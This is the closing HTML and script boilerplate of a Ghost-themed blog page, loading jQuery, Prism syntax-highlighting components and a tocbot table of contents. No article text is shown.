            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=ed47c1e075"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<!-- plugins like copy btn and line numbers -->
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js" integrity="sha512-st608h+ZqzliahyzEpETxzU0f7z7a9acN6AFvYmHvpFhmcFuKT8a22TT5TpKpjDa3pt3Wv7Z3SdQBCBdDPhyWA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js" integrity="sha512-/kVH1uXuObC0iYgxxCKY41JdWOkKOxorFVmip+YVifKsJ4Au/87EisD1wty7vxN2kAhnWh6Yc8o/dSAXj6Oz7A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<!--<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha512-BttltKXFyWnGZQcRWj6osIg7lbizJchuAMotOkdLxHxwt/Hyo+cl47bZU0QADg+Qt5DJwni3SbYGXeGMB5cBcw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-->

<!-- themees -->
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js" integrity="sha512-8VrjxGFLIkS0mgEmO3p46A5OkqATHhrNVwyv2V7yUeZrk1jmSDuI3SOEpC9XHEHUWEOsfzzcJeBlUkee9lKGrw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js" integrity="sha512-3KphgbiKTzK2CNxlSgUKypipTV7tWknO5czNb+E7H4CeHOOSer2s2rIOCTuz8NsY1zm+B9tP9Ul2JX/tmdyOYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js" integrity="sha512-QXFMVAusM85vUYDaNgcYeU3rzSlc+bTV4JvkfJhjxSHlQEo+ig53BtnGkvFTiNJh8D+wv6uWAQ2vJaVmxe8d3w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-diff.min.js" integrity="sha512-tBR4SAva+2bw36ToxaFeOEvgqxWHON25E9xp+kEBfw175sS5OusQEH8GrigKgTdHUXcKsK1yiyfo7fctBYl+rA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-toml.min.js" integrity="sha512-R9JG7uVdcjWlZvEWyP3KfxtexvT1uIlKUF/dYVmZRbvJyMobK6zGCpIM2gLVqYjLSYeL/zBjOVpP7vXxVtzfCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-makefile.min.js" integrity="sha512-9MXjDxOwWNLJZRSwZRFdc1lvSIxld5c9DeLhySKjTAIEpj8a48Kezdc/hKjUsyD8S+oa3a+5SpuqdcCFodSI3Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
    $("pre").addClass("line-numbers");
</script>

<script>
      $('.gh-content').prepend('<aside class="gh-sidebar"><div class="gh-toc"></div></aside>');
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.25.0/tocbot.min.js" integrity="sha512-P4MxNnVYFHmkj6ZlNusCPMjrqfYF7/AWRM0m7vEHkzTITuiW/6LaXk/Ah/mheuPI1xI80it2dP/8Nz+FLJT9MQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
    tocbot.init({
        tocSelector: '.gh-toc',
        contentSelector: '.gh-content',
        headingSelector: 'h1, h2, h3, h4',
        hasInnerContainers: true,
  		collapseDepth: 2
    });
</script>

<script>
      $('.gh-toc').prepend('<h5>Table of contents</h5>');
</script>

<script>
  $('.gh-burger').attr('aria-label', 'menu button');
  $('.gh-search').attr('aria-label', 'search button');
  $(".author-name a").attr("aria-label", "author notselwyn");
  $(".author-profile-image").attr("aria-label", "author notselwyn");
  $(".gh-search.gh-icon-btn").remove();
</script>

</body>
</html>
